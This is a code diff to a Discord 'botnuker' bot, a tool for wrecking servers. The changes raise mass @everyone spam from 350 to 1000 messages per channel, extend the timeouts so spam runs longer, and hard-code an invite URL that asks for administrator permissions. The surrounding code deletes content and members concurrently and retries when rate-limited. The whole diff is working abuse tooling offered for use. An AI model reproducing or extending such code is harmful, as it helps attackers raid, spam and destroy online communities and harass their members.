@@ -23,7 +23,7 @@ NUKE_INVITE_LINK = "https://discord.gg/BxTk5SrBv"
 NUKE_INVITE_TEXT = f"@everyone {NUKE_INVITE_LINK}"
 NUKE_INVITES_PER_CHANNEL = 1
 
-SPAMALL_DEFAULT_PER_CHANNEL = 350
+SPAMALL_DEFAULT_PER_CHANNEL = 1000
 
 CONC_DELETE = 16
 CONC_MEMBERS = 16
@@ -34,7 +34,7 @@ TIMEOUT_RENAME = 20
 TIMEOUT_DELETE = 240
 TIMEOUT_MEMBERS = 240
 TIMEOUT_CREATE = 480
-TIMEOUT_INVITE = 600
+TIMEOUT_INVITE = 3600
 
 GLOBAL_LOCK = asyncio.Semaphore(22)
 
@@ -95,7 +95,7 @@ async def safe_send(target, content: str = None, embed=None):
     except Exception:
         pass
 
-async def worker_pool(items, handler, concurrency: int, phase_timeout: float):
+async def worker_pool(items, handler, concurrency: int, phase_timeout: float, per_item_timeout: float = 20):
     sem = asyncio.Semaphore(concurrency)
     results = []
     extra_delay = 0.0
@@ -107,14 +107,14 @@ async def worker_pool(items, handler, concurrency: int, phase_timeout: float):
             if extra_delay > 0:
                 await asyncio.sleep(extra_delay)
             try:
-                r = await asyncio.wait_for(handler(item), timeout=20)
+                r = await asyncio.wait_for(handler(item), timeout=per_item_timeout)
                 results.append(r)
             except RateLimited:
                 async with lock:
                     extra_delay = min(extra_delay + 0.20, 1.5)
                 try:
                     await asyncio.sleep(1.0)
-                    r = await asyncio.wait_for(handler(item), timeout=20)
+                    r = await asyncio.wait_for(handler(item), timeout=per_item_timeout)
                     results.append(r)
                 except Exception:
                     results.append(None)
@@ -148,12 +148,11 @@ async def help_cmd(ctx):
 @bot.command(name="invite")
 async def invite_cmd(ctx):
     client_id = bot.user.id
-    perms = discord.Permissions(administrator=True)
-    invite_url = discord.utils.oauth_url(client_id, permissions=perms)
+    invite_url = f"https://discord.com/oauth2/authorize?client_id={client_id}&permissions=8&scope=bot%20applications.commands"
 
     embed = discord.Embed(
         title="Invite botnuker",
-        description="Haz clic en el enlace de abajo para añadir el bot a tu servidor.",
+        description="Haz clic en el enlace de abajo para anadir el bot a tu servidor.",
         color=discord.Color.white(),
         url=invite_url,
     )
@@ -239,7 +238,8 @@ async def spam_all(ctx, msg: str = "@everyone", per_channel: int = SPAMALL_DEFAU
             await safe_call(lambda ch=ch: ch.send(msg))
             await asyncio.sleep(0.35)
 
-    await worker_pool(channels, spam_channel, CONC_SEND, TIMEOUT_INVITE)
+    per_channel_timeout = per_channel * 0.5 + 60
+    await worker_pool(channels, spam_channel, CONC_SEND, TIMEOUT_INVITE, per_item_timeout=per_channel_timeout)
     await safe_send(ctx, "SPAMALL DONE")
 
 @bot.command(name="delroles")
